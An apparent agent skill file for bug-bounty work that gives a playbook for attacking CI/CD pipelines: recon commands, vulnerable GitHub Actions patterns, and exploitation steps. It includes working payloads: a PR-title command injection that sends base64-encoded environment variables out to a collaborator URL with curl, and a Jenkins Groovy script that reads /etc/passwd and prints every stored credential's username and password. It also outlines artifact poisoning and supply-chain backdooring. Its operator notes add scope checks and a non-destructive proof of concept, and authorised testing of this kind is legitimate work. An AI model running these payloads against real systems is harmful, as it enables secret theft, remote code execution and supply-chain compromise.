---
name: cicd-pipeline-attacks
description: "Attack CI/CD pipelines — GitHub Actions expression injection via PR title/body, pull_request_target executing fork code with secrets, Jenkins Groovy console RCE, GitLab CI variable exposure, artifact poisoning, and secrets leaked into build logs. Use when the target exposes workflow files, a Jenkins/GitLab instance, or public repos wired to self-hosted runners."
---

# CI/CD Pipeline Attacks

## Crown Jewel Targets

- **Open-source repos with `pull_request_target` trigger** -- attacker forks repo, modifies code, opens PR, workflow runs attacker code WITH repo secrets and WRITE token
- **Jenkins instances with exposed Groovy Script Console** -- `/script` or `/jenkins/script` = instant RCE. Enumerate credentials with `CredentialsProvider.lookupCredentials()`
- **GitHub Actions workflows using `${{ github.event.* }}` in `run:` blocks** -- expression injection via PR title/body/comment = shell command injection
- **GitLab CI with public pipeline logs** -- build logs often contain leaked env vars, deploy tokens, API keys printed in debug output
- **Azure DevOps with self-hosted agents** -- compromised agent = lateral movement into internal network, access to service connections
- **npm/Maven/PyPI publishing workflows** -- supply chain attack: if you can influence the build, you can publish backdoored packages

## Attack Surface Signals

- **URL patterns**: `/jenkins`, `/jenkins/script`, `/jenkins/api/json`, `/.github/workflows/`, `/ci/`, `/build/`, `/drone/`, `/concourse/`
- **GitHub signals**: `.github/workflows/*.yml` files in public repos, `pull_request_target` trigger, `${{ github.event.` in run blocks
- **Tech signals**: `Jenkins-Crumb` header, `JENKINS_URL` env var, `X-Jenkins` response header, GitLab runner tokens in logs
- **Recon**: `gh repo list TARGET_ORG --public` to enumerate all public repos and their workflow files

## Why High Accept Rate (70%)

CI/CD vulns are high-value because:
- Direct path to secrets (AWS keys, deploy tokens, signing keys)
- Often RCE in build environment
- Low duplicate risk (few hunters look here)
- Programs increasingly list CI/CD in scope

## Recon — Finding CI/CD Exposure

### 1. GitHub Actions workflow analysis
```bash
# Find all public repos for target org
gh repo list TARGET_ORG --public --limit 200 --json name,url -q '.[].url'

# Download all workflow files
for repo in $(gh repo list TARGET_ORG --public -L 200 --json name -q '.[].name'); do
  gh api "repos/TARGET_ORG/$repo/contents/.github/workflows" -q '.[].download_url' 2>/dev/null
done

# Grep for dangerous patterns
grep -rn 'pull_request_target' .github/workflows/  # Dangerous trigger
grep -rn '\${{.*github\.event' .github/workflows/   # Expression injection
grep -rn 'actions/checkout.*ref.*head' .github/workflows/  # PR code checkout
```

### 2. Exposed CI/CD interfaces
```bash
# Jenkins
curl -s https://target.com/jenkins/ | grep -i jenkins
curl -s https://target.com/jenkins/script  # Groovy console (RCE if unauth)
curl -s https://target.com/jenkins/api/json  # API exposure

# GitLab CI
curl -s https://gitlab.target.com/api/v4/projects?visibility=public

# Common paths
/jenkins /ci /build /drone /concourse /teamcity /bamboo /circleci
```

### 3. Secret scanning in CI configs
```bash
# Hardcoded secrets in workflow files
grep -rniE '(password|token|key|secret|credential).*[:=]' .github/workflows/
grep -rn 'env:' .github/workflows/ | grep -vi 'GITHUB_'  # Non-default env vars
```

## Attack Vectors

### A. GitHub Actions — Expression Injection (CRITICAL)

**Vulnerable pattern:**
```yaml
# VULNERABLE: Attacker controls PR title → shell injection
- run: echo "PR title is ${{ github.event.pull_request.title }}"
```

**Exploit:** Create PR with title: `"; curl https://COLLAB_URL/$(env | base64) #`

**Safe check:** Look for `${{ github.event.* }}` used directly in `run:` blocks without sanitization.

### B. pull_request_target with checkout (CRITICAL)

**Vulnerable pattern:**
```yaml
on: pull_request_target  # Runs with WRITE token + secrets
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # Checks out ATTACKER code
  - run: npm install  # Executes attacker's package.json scripts
```

**Exploit:** Fork repo → modify `package.json` scripts → open PR → workflow runs attacker code with repo secrets.

### C. Artifact Poisoning

```bash
# Check if workflows download artifacts from other workflows without verification
grep -rn 'actions/download-artifact' .github/workflows/
grep -rn 'dawidd6/action-download-artifact' .github/workflows/  # Cross-workflow
```

### D. Jenkins Groovy Console RCE

```groovy
// If /script is accessible (unauth or with leaked creds)
println "whoami".execute().text
println "cat /etc/passwd".execute().text
// Enumerate secrets:
com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
  jenkins.model.Jenkins.instance, null, null
).each { println "${it.id}: ${it.username} / ${it.password}" }
```

### E. GitLab CI — Variable Exposure

```bash
# Public pipeline logs may leak variables
curl -s "https://gitlab.target.com/api/v4/projects/PROJECT_ID/pipelines" \
  | jq '.[].id' | head -5

# Check job logs for secrets
curl -s "https://gitlab.target.com/api/v4/projects/PROJECT_ID/jobs/JOB_ID/trace"
```

## Impact Demonstration

Must prove at least ONE:
1. **Secret extraction**: Read CI/CD secrets (AWS keys, tokens, deploy keys)
2. **Code execution**: RCE in build environment
3. **Supply chain**: Ability to modify build artifacts or deployments
4. **Lateral movement**: Access to internal infrastructure via CI runner

## Triage Checklist

- [ ] Identified specific vulnerable CI/CD configuration
- [ ] Demonstrated exploitation path (not just "misconfiguration exists")
- [ ] Proved secret access or code execution
- [ ] Confirmed target org owns the affected repository
- [ ] Verified repository is in scope (public repos of in-scope org)
- [ ] Not a test/demo/archived repository

## Operator Notes (Battle-Tested)

1. **Check public repos FIRST ()** -- `gh repo list TARGET_ORG --public --limit 200` then download all workflow files. Grep for `pull_request_target` and `${{ github.event.` patterns. This is passive recon that requires zero interaction with the target.
2. **Jenkins `/script` is the highest-value endpoint** -- if accessible (unauthenticated or with leaked creds), it gives instant RCE. Always check `/jenkins/script`, `/script`, `/jenkins/scriptApproval/`. Also check `/jenkins/api/json` for structure enumeration.
3. **Expression injection PoC must be non-destructive** -- create a PR with title `"; echo "INJECTION_TEST" #` and capture the workflow log showing your injected command executed. Do NOT exfiltrate real secrets in the PoC -- prove execution, then describe the impact path.
4. **Artifact poisoning requires cross-workflow download** -- grep for `actions/download-artifact` or `dawidd6/action-download-artifact` in workflow files. If a deployment workflow downloads artifacts from a build workflow without signature verification, artifacts can be poisoned.
5. **Verify the repo is in scope** -- CI/CD findings on test/demo/archived repos are rejected. Confirm the repository belongs to the target org and is actively maintained (recent commits, not archived).

## Related Skills & Chains

| When | Go to |
|------|-------|
| Jenkins console leads to command execution | `command-injection-testing` |
| CI/CD secrets enable SSRF/cloud access | `ssrf-testing` |
| API endpoints discovered in CI configs | `api-security-testing` |
| Role/permission escalation in CI platform | `access-control-testing` |
